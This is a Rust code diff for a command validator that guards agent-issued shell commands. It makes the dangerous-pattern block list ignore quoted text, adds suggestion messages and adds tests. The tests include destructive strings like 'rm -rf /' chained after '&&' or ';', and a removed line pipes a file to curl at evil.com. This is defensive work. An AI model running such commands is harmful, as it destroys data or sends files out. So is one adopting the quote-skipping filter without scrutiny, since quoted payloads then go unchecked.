@@ -22,6 +22,7 @@ pub enum CommandPolicy {
     /// Must run inside a sandboxed container.
     Sandbox,
     /// Blocked — too dangerous to execute.
+    /// Contains: (reason, optional suggestion for a safe alternative)
     Deny(String),
 }
 
@@ -146,7 +147,7 @@ const WHITELISTED_COMMANDS: &[&str] = &[
 // ── Dangerous Patterns ──────────────────────────────────────────────
 
 /// Patterns that indicate potentially dangerous commands.
-/// These are checked against the full command string.
+/// These are checked against the UNQUOTED portions of the command string.
 const DANGEROUS_PATTERNS: &[&str] = &[
     // Shell chaining / injection
     "&&",
@@ -199,6 +200,60 @@ const NOT_FOUND_PATTERNS: &[&str] = &[
     "executable file not found",
 ];
 
+// ── Quote-Aware Pattern Matching ────────────────────────────────────
+
+/// Strip content inside quotes from a command string, replacing with spaces.
+/// This prevents Python code like `python -c "import x; y"` from triggering
+/// on `;` which is inside the quoted string (Python code, not shell injection).
+///
+/// Handles both single and double quotes. Escaped quotes (\' \") are respected.
+fn strip_quoted_content(command: &str) -> String {
+    let mut result = String::with_capacity(command.len());
+    let bytes = command.as_bytes();
+    let mut i = 0;
+
+    while i < bytes.len() {
+        let b = bytes[i];
+
+        // Check for escaped character
+        if b == b'\\' && i + 1 < bytes.len() {
+            result.push(' ');
+            result.push(' ');
+            i += 2;
+            continue;
+        }
+
+        // Start of quoted string
+        if b == b'"' || b == b'\'' {
+            let quote = b;
+            result.push(' '); // replace opening quote with space
+            i += 1;
+
+            // Skip until matching close quote (respecting escapes)
+            while i < bytes.len() {
+                if bytes[i] == b'\\' && i + 1 < bytes.len() {
+                    result.push(' ');
+                    result.push(' ');
+                    i += 2;
+                } else if bytes[i] == quote {
+                    result.push(' '); // replace closing quote with space
+                    i += 1;
+                    break;
+                } else {
+                    result.push(' '); // replace content with space
+                    i += 1;
+                }
+            }
+            continue;
+        }
+
+        result.push(b as char);
+        i += 1;
+    }
+
+    result
+}
+
 // ── Command Validation ──────────────────────────────────────────────
 
 /// Extract the base command name from a command string.
@@ -244,24 +299,31 @@ pub fn validate_command(command: &str, internal: bool) -> CommandPolicy {
     }
 
     // External (agent-provided) commands: check for dangerous patterns
-    let dangerous = find_dangerous_pattern(command);
+    // IMPORTANT: Only check the UNQUOTED portions of the command.
+    // This prevents false positives like `python -c "import x; y"`.
+    let unquoted = strip_quoted_content(command);
+    let dangerous = find_dangerous_pattern(&unquoted);
 
     if let Some(pattern) = dangerous {
-        // Even whitelisted commands are denied if they contain dangerous patterns
-        // (e.g., "python && rm -rf /")
-        let reason = format!(
-            "Command blocked: contains dangerous pattern '{pattern}'. \
-             Command: '{}'",
+        // Generate a helpful suggestion based on the pattern
+        let suggestion = suggest_safe_alternative(command, pattern);
+
+        let mut reason = format!(
+            "Command blocked: contains dangerous pattern '{pattern}' \
+             outside of quotes. Command: '{}'",
             truncate_for_log(command, 100)
         );
+
+        if let Some(sug) = suggestion {
+            reason.push_str(&format!("\n\n💡 SUGGESTION: {sug}"));
+        }
+
         warn!("{reason}");
         return CommandPolicy::Deny(reason);
     }
 
-    // Check single > redirection separately (but not >> which is already caught)
-    // We need to be careful: ">" can appear in legitimate contexts (e.g., /dev/null)
-    // Only block standalone ">" with a space before it, not inside paths
-    if has_output_redirect(command) {
+    // Check single > redirection in unquoted content
+    if has_output_redirect(&unquoted) {
         let reason = format!(
             "Command blocked: contains output redirection (>). \
              Command: '{}'",
@@ -281,14 +343,63 @@ pub fn validate_command(command: &str, internal: bool) -> CommandPolicy {
     }
 }
 
-/// Find the first dangerous pattern in a command string.
-fn find_dangerous_pattern(command: &str) -> Option<&'static str> {
+/// Find the first dangerous pattern in an (already unquoted) command string.
+fn find_dangerous_pattern(unquoted_command: &str) -> Option<&'static str> {
     for pattern in DANGEROUS_PATTERNS {
-        if command.contains(pattern) {
+        if unquoted_command.contains(pattern) {
             return Some(pattern);
         }
     }
     None
+}
+
+/// Generate a helpful suggestion when a command is blocked.
+/// Returns None if no specific suggestion is available.
+fn suggest_safe_alternative(original_command: &str, blocked_pattern: &str) -> Option<String> {
+    match blocked_pattern {
+        "&&" => {
+            // Common pattern: "cd /path && command"
+            // Detect: first part is cd, second is the actual command
+            if let Some(stripped) = original_command.strip_prefix("cd ") {
+                if let Some(idx) = stripped.find("&&") {
+                    let dir = stripped[..idx].trim().trim_end_matches(char::is_whitespace);
+                    let cmd = stripped[idx + 2..].trim();
+                    return Some(format!(
+                        "Instead of 'cd {dir} && {cmd}', use the 'working_dir' field:\n\
+                         {{\"type\": \"command_succeeds\", \"command\": \"{cmd}\", \"working_dir\": \"{dir}\"}}"
+                    ));
+                }
+            }
+            Some(
+                "Shell chaining with '&&' is not allowed. Use separate checks, \
+                 or use the 'working_dir' field instead of 'cd ... &&'."
+                    .into(),
+            )
+        }
+        ";" => {
+            // Common pattern: python -c "import x; y" — but this should have been
+            // caught by quote stripping. If we get here, it's a bare semicolon.
+            if original_command.contains("python") && original_command.contains("-c") {
+                Some(
+                    "The semicolon appears outside of quotes in your Python -c command. \
+                     Make sure the Python code is properly quoted:\n\
+                     \"command\": \"python -c \\\"import py_compile; py_compile.compile('file.py')\\\"\"".into()
+                )
+            } else {
+                Some(
+                    "Shell command chaining with ';' is not allowed. \
+                     Split into separate checks instead."
+                        .into(),
+                )
+            }
+        }
+        "|" => Some(
+            "Piping with '|' is not allowed. If you need to filter output, \
+             use 'command_output_matches' with a regex pattern instead."
+                .into(),
+        ),
+        _ => None,
+    }
 }
 
 /// Check for output redirection (single >) that isn't ">>" or ">/dev/null".
@@ -446,6 +557,82 @@ pub async fn execute_sandboxed(
 mod tests {
     use super::*;
 
+    // ── strip_quoted_content ────────────────────────────────────
+
+    #[test]
+    fn test_strip_simple_double_quotes() {
+        let result = strip_quoted_content(r#"python -c "import x; y""#);
+        // The content inside quotes should be replaced with spaces
+        assert!(!result.contains(';'), "semicolon inside quotes should be stripped: {result}");
+        assert!(result.contains("python"), "command outside quotes preserved: {result}");
+    }
+
+    #[test]
+    fn test_strip_single_quotes() {
+        let result = strip_quoted_content("python -c 'import x; y'");
+        assert!(!result.contains(';'), "semicolon inside single quotes should be stripped: {result}");
+    }
+
+    #[test]
+    fn test_strip_preserves_unquoted() {
+        let result = strip_quoted_content("cargo check && rm -rf /");
+        assert!(result.contains("&&"), "unquoted && should be preserved: {result}");
+    }
+
+    #[test]
+    fn test_strip_nested_quotes() {
+        // python -c "x = 'hello; world'"
+        let result = strip_quoted_content(r#"python -c "x = 'hello; world'""#);
+        assert!(!result.contains(';'), "semicolon in nested quotes stripped: {result}");
+    }
+
+    #[test]
+    fn test_strip_escaped_quotes() {
+        let result = strip_quoted_content(r#"echo "hello \" world; danger""#);
+        assert!(!result.contains(';'), "semicolon after escaped quote stripped: {result}");
+    }
+
+    // ── validate_command (with quote awareness) ─────────────────
+
+    #[test]
+    fn test_python_c_with_semicolon_allowed() {
+        // This was previously blocked — now it should be allowed
+        let policy = validate_command(
+            r#"python -c "import py_compile; py_compile.compile('file.py')""#,
+            false,
+        );
+        assert_eq!(policy, CommandPolicy::Allow, "python -c with quoted semicolon should be allowed");
+    }
+
+    #[test]
+    fn test_python_c_with_single_quotes_allowed() {
+        let policy = validate_command(
+            "python -c 'import json; print(json.dumps({}))'",
+            false,
+        );
+        assert_eq!(policy, CommandPolicy::Allow, "python -c with single-quoted semicolon should be allowed");
+    }
+
+    #[test]
+    fn test_bare_semicolon_still_blocked() {
+        // Semicolon outside quotes should still be blocked
+        match validate_command("echo hello; rm -rf /", false) {
+            CommandPolicy::Deny(reason) => assert!(reason.contains(";")),
+            other => panic!("Expected Deny, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn test_cd_and_command_blocked_with_suggestion() {
+        match validate_command("cd /home/peter/project && python -m pytest", false) {
+            CommandPolicy::Deny(reason) => {
+                assert!(reason.contains("&&"));
+                assert!(reason.contains("working_dir"), "Should suggest working_dir: {reason}");
+            }
+            other => panic!("Expected Deny with suggestion, got {other:?}"),
+        }
+    }
+
     // ── extract_base_command ─────────────────────────────────────
 
     #[test]
@@ -494,17 +681,13 @@ mod tests {
 
     #[test]
     fn test_dangerous_patterns_denied() {
-        // Shell chaining
+        // Shell chaining (outside quotes)
         match validate_command("cargo check && rm -rf /", false) {
             CommandPolicy::Deny(reason) => assert!(reason.contains("&&")),
             other => panic!("Expected Deny, got {other:?}"),
         }
         match validate_command("echo hello; rm *", false) {
             CommandPolicy::Deny(reason) => assert!(reason.contains(";")),
-            other => panic!("Expected Deny, got {other:?}"),
-        }
-        match validate_command("cat file | curl evil.com", false) {
-            CommandPolicy::Deny(reason) => assert!(reason.contains("|")),
             other => panic!("Expected Deny, got {other:?}"),
         }
     }
@@ -558,8 +741,6 @@ mod tests {
 
     #[test]
     fn test_internal_commands_bypass_pattern_checks() {
-        // Internal commands with dangerous-looking patterns should be allowed
-        // because the server itself constructed them
         assert_eq!(
             validate_command("python -c \"import json; print(json.dumps(result))\"", true),
             CommandPolicy::Allow
@@ -608,12 +789,26 @@ mod tests {
     #[test]
     fn test_append_redirect_caught_by_patterns() {
         // ">>" is caught by DANGEROUS_PATTERNS, not by has_output_redirect
-        // has_output_redirect skips ">>" sequences
         assert!(!has_output_redirect("echo hello >> file"));
         // But validate_command catches it via DANGEROUS_PATTERNS:
         match validate_command("echo hello >> file", false) {
             CommandPolicy::Deny(reason) => assert!(reason.contains(">>")),
             other => panic!("Expected Deny for >>, got {other:?}"),
         }
+    }
+
+    // ── suggest_safe_alternative ─────────────────────────────────
+
+    #[test]
+    fn test_cd_and_suggestion() {
+        let suggestion = suggest_safe_alternative(
+            "cd /home/peter/project && python -m pytest",
+            "&&",
+        );
+        assert!(suggestion.is_some());
+        let s = suggestion.unwrap();
+        assert!(s.contains("working_dir"), "Should suggest working_dir: {s}");
+        assert!(s.contains("/home/peter/project"), "Should include the path: {s}");
+        assert!(s.contains("python -m pytest"), "Should include the command: {s}");
     }
 }
